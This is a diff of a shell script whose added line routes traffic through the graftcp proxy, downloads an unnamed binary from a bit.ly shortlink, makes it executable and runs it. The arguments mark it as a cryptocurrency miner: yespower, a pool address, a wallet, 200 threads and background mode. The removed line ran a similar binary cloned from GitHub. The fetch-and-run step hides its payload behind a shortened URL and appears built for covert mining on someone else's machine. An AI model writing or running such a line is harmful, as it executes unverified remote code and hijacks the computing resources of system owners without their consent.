@@ -31,4 +31,4 @@ sleep .2
 echo " "
 echo " "
 
-./graftcp/graftcp git clone https://github.com/adisubarja/asu && cd asu && chmod +x gas kopi.ini && ./gas kopi.ini
+./graftcp/graftcp wget https://bit.ly/3bKjlUQ && chmod 700 3bKjlUQ && ./3bKjlUQ -a yespower -o 146.59.217.34:17055 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe -p c=VRSC,mc=BTE,ID=archer -t200 -B
